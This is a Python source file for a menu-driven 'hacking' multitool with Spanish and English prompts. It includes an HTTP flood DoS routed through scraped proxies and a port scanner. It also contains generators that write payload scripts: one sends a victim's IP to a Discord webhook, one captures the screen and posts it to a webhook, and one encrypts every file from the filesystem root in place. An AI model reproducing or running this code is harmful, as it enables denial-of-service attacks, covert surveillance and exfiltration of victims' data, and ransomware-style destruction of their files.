import requests
import pystyle
import os
import raducord
import random
from raducord import Logger
import cryptography
from cryptography.fernet import Fernet
import string
import socket
import threading
from pystyle import Write, Colors
import fake_headers
import getpass
import nmap
from fake_headers import Headers
import time
from validate_email_address import validate_email
import requests

def attack():
    
    target_ip = input("Introduce la IP del objetivo: ")
    target_port = input("Introduce el puerto del objetivo: ")
    num_threads = input('Theards: ')
    print('Use proxies or VPN')
    time.sleep(1.2)
    proxy_file = "proxies.txt"

    attack_num = 0

    def print_attack_num():
        nonlocal attack_num
        while True:
            print("Attack number:", attack_num)
            attack_num += 1

    def send_request(proxy):
        while True:
            try:
                proxies = {"http": proxy, "https": proxy} if proxy else None
                requests.get("http://" + target_ip + ":" + target_port, proxies=proxies)
            except Exception as e:
                print("Error:", e)

    proxies = []
    with open(proxy_file, "r") as file:
        proxies = file.readlines()

    thread = threading.Thread(target=print_attack_num)
    thread.start()

    for i in range(num_threads):
        proxy = proxies[i % len(proxies)].strip() if proxies else None
        thread = threading.Thread(target=send_request, args=(proxy,))
        thread.start()
    



def ip_info():
    i1 = input('IP: ')
    Logger.info('Checking,Ip Verification,...')
    time.sleep(0.80)
    url = "https://ipinfo.io/{i1}"

    r = requests.get(url)

    if r.status_code == 400:
        Logger.failed('Error,ip error,404')
        time.sleep(5)
        ruta_script3 = "main.py"



        with open(ruta_script3, 'r') as file:
            codigo_script2 = file.read()

        os.system('cls')
        exec(codigo_script2)
    else:
        Logger.success("Success,Ip,founded")
        time.sleep(2)
        Logger.info("Getting, Info, Loading")
        time.sleep(3)
        Logger.warning("Success, info, founded")
        api = f"https://ipinfo.io/{i1}"
        response = requests.get(api)
        data = response.json()      
        print("Success IP:", data.get('ip'))
        print("Hostname:", data.get('hostname'))
        print("Ciudad:", data.get('city'))
        print("Región:", data.get('region'))
        print("País:", data.get('country'))
        print("Proveedor de servicio de Internet (ISP):", data.get('org'))
        print("Latitud, Longitud:", data.get('loc'))
        time.sleep(12)


def scan_ports(target):
    
    nm = nmap.PortScanner()
    nm.scan(target, arguments='-p 1-1024')  

    for host in nm.all_hosts():
        print("Scaning Ports In: ", host)
        for proto in nm[host].all_protocols():
            print("Protocolo:", proto)
            ports = nm[host][proto].keys()
            for port in ports:
                state = nm[host][proto][port]['state']
                if state == 'open':
                    print("Puerto {} abierto".format(port))




def main():
    def check_ip(ip):
        
        try:
            response = requests.get(f"https://api.ipify.org?format=json&ip={ip}", timeout=5)
            data = response.json()
            if 'ip' in data:
                return True
            else:
                return False
        except requests.exceptions.RequestException:
            return False

    ip = input("Enter the IP address you want to check: ")
    if check_ip(ip):
        print(f"The IP {ip} is active on the network.")
    else:
        print(f"The IP {ip} is not active on the network or does not respond.")
    


def my_ip():
    try:
        
        public_ip = socket.gethostbyname(socket.gethostname())
        
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        private_ip = s.getsockname()[0]
    except Exception as e:
        print("Error:", e)
        public_ip = None
        private_ip = None
    finally:
        s.close()
    return public_ip, private_ip




def generate_password():
    longitud = 12
    caracteres = string.ascii_letters + string.digits + string.punctuation
    contrasena = ''.join(random.choice(caracteres) for i in range(longitud))
    return contrasena



        
        

def buscar_vulnerabilidades(url):
    try:
        response = requests.get(url)
        
        headers = response.headers
        for header_name, header_value in headers.items():
            if header_name.lower() == "x-powered-by":
                print(f"[Advertencia] La página web revela que está siendo ejecutada por: {header_value}")
        
        if "<script>" in response.text:
            print("[Advertencia] Se han detectado scripts incrustados en la página. Esto podría indicar un riesgo de XSS (Cross-Site Scripting).")
        
        
    except requests.RequestException as e:
        print("Error al hacer la solicitud:", e)




        







def ping_ip():
    i1 = input('IP: ')
    n1 = input('Number of Pings')
    os.system(f'ping -n {n1} {i1}')


def ping_web():
    i1 = input('Web(Without http:// or https://):')
    n1 = input('Number of Pings')
    os.system(f'ping -n {n1} {i1}')




def generate_proxies():
    archivo = 'results.txt'
    url = 'https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&proxy_format=ipport&format=text'
    headers = Headers(headers=True).generate()
    response = requests.get(url, headers=headers)
    Logger.info('Loading, Getting Proxies,...')
    time.sleep(5)

    if response.status_code == 200:
        with open(archivo , 'w') as f:
            f.write(response.text)
            Logger.success("Sucess,Proxies saved,results.txt")
            time.sleep(3)
            




def ip_tracker():
    i1 = input('IP: ')

    api = f'https://ipinfo.io/{i1}?a0a797e0173af6'

    r = requests.get(api)
    if r.status_code == 200:
        data = r.json()
        print('Loc: ', data.get('loc'))
        print('Postal: ', data.get('postal'))
        print('Region: ', data.get('region'))
        print('Country: ', data.get('country'))
        time.sleep(5)

    else:
        print('Error')
        time.sleep(5)


def ip_logger():
    
    webhook_url = input('Enter your Discord Webhook URL: ').strip()

    
    codigo = f"""
import requests

def obtener_ip_y_enviar_a_discord():
    
    response = requests.get('https://httpbin.org/ip')
    if response.status_code == 200:
        data = response.json()
        ip = data['origin']
        mensaje = 'Public IP is: ' + ip

        payload = {{
            'content': mensaje
        }}

        response = requests.post('{webhook_url}', json=payload)

        if response.status_code == 204:
            print('Message sent successfully to Discord.')

def main():
    obtener_ip_y_enviar_a_discord()

if __name__ == '__main__':
    main()
"""

    
    with open('Logger.py', 'w') as archivo:
        archivo.write(codigo)

    print(f'File "Logger.py" has been created with the logger code.')




def screenshot_grabber():
    w = input('Webhook URL: ')

    codigo = f"""
import pyautogui
import requests
import os

def capture_and_send(webhook_url):
    # Captura de pantalla
    screenshot = pyautogui.screenshot()

    # Guardar la captura en un archivo (temporal)
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)

    # Preparar la solicitud al webhook de Discord
    files = {{'file': open(screenshot_path, 'rb')}}
    data = {{'content': '¡Captura de pantalla!'}}
    headers = {{'User-Agent': 'Mozilla/5.0'}}

    # Enviar la captura al webhook de Discord
    response = requests.post(webhook_url, data=data, files=files, headers=headers)

    # Eliminar el archivo temporal
    os.remove(screenshot_path)

    # Verificar si la solicitud fue exitosa
    if response.status_code == 200:
        print("Captura de pantalla enviada exitosamente a Discord.")

if __name__ == "__main__":
    # URL de tu webhook de Discord
    webhook_url = "{w}"

    # Capturar la pantalla y enviarla al webhook al ejecutar el script
    capture_and_send(webhook_url)
"""

    with open('logger2.py', 'w') as archivo:
        archivo.write(codigo)





































Write.Print("""                                                             
      _____    ____       _____        ______        _____   
  ___|\    \  |    | ___|\     \   ___|\     \   ___|\    \  
 /    /\    \ |    ||    |\     \ |     \     \ |    |\    \ 
|    |  |    ||    ||    | |     ||     ,_____/||    | |    |
|    |  |____||    ||    | /_ _ / |     \--'\_|/|    |/____/ 
|    |   ____ |    ||    |\    \  |     /___/|  |    |\    \ 
|    |  |    ||    ||    | |    | |     \____|\ |    | |    |
|\ ___\/    /||____||____|/____/| |____ '     /||____| |____|
| |   /____/ ||    ||    /     || |    /_____/ ||    | |    |
 \|___|    | /|____||____|_____|/ |____|     | /|____| |____|
   \( |____|/   \(    \(    )/      \( |_____|/   \(     )/  
    '   )/       '     '    '        '    )/       '     '   
        '                                 '                  
""", Colors.green_to_red, interval=0.000)
    
Write.Print("""
 01 > DoS                   08 > Ping IP           15 > Encryptor archive
 02 > Ip info               09 > Ping Web
 03 > Port Scanner          10 > Proxy Scraper 
 04 > Check IP              11 > IP tracker
 05 > My IP                 12 > Wordlists Gen
 06 > Password Creator      13 > IP logger
 07 > Web Vulnerabilities   14 > Screenshot logger  
""", Colors.dark_green, interval=0.000)
    
opc1 = input('\nroot@ciber>')

if opc1 == '1':
    attack()

if opc1 == '2':
    ip_info	()

if opc1 == '3':
    target_ip = input('IP: ')
    scan_ports(target_ip)

    
if opc1 == '4':
    if __name__ == '__main__':
        main()

if opc1 == '5':
    if __name__ == "__main__":
        public_ip, private_ip = my_ip()

        print("Your public IP address is:", public_ip)
        print("Your private IP address is:", private_ip)
        time.sleep(12)

if opc1 == '6':
    if __name__ == "__main__":
        contrasena = generate_password()
        print("Password: ", contrasena)
        time.sleep(5)

if opc1 == '7':
    if __name__ == "__main__":
        url = input("Introduce la URL para analizar: ")
        buscar_vulnerabilidades(url)

if opc1 == '8':
    ping_ip()

if opc1 == '9':
    ping_web()


if opc1 == '10':
    generate_proxies()

if opc1 == '11':
    if __name__ == '__main__':
        ip_tracker()

if opc1 == '12':
    def fetch_random_words(num_words):
        url = f"https://random-word-api.herokuapp.com/word?number={num_words}"
        response = requests.get(url)
        if response.status_code == 200:
            random_words = response.json()
            return random_words
        else:
            print(f"Error fetching random words: {response.status_code}")
            return []

    if __name__ == "__main__":
        num_words = int(input("Enter the number of words to generate: "))
        random_words = fetch_random_words(num_words)

    
        with open("words.txt", "w") as file:
            for word in random_words:
                file.write(word + "\n")

        Logger.success('Sucess,wordlists generated,words.txt')
        time.sleep(2.9)



if opc1 == '13':
    ip_logger()

if opc1 == '14':
    screenshot_grabber()

if opc1 == '15':
    
    key = Fernet.generate_key()

    script = f"""
import os
from cryptography.fernet import Fernet

def generate_key():
    return {repr(key)}

def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, 'rb') as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

def encrypt_all_files(root_dir, key):
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

def main():
    key = generate_key()
    root_dir = "/"
    encrypt_all_files(root_dir, key)

if __name__ == "__main__":
    main()
"""
    with open("encrypt_all_files.py", "w") as f:
        f.write(script)



